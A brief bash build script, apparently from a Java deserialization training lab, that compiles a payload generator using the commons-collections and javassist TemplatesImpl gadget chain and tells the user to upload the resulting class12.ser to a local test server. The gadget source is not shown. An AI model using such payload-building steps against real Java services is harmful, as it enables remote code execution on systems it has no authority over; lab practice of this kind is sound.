#!/bin/bash
# class12 — TemplatesImpl (javassist)
cd "$(dirname "$0")"
JAVA_FLAGS="\
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED"
CP="../lib/commons-collections-3.2.1.jar:../lib/javassist-3.29.2-GA.jar"
javac $JAVA_FLAGS -cp "$CP" GenPayload.java -d .
java $JAVA_FLAGS -cp ".:$CP" class12.GenPayload
rm -rf class12
mv *.ser .. 2>/dev/null
echo "🎯 上传 class12.ser 到 http://localhost:81/class12/"
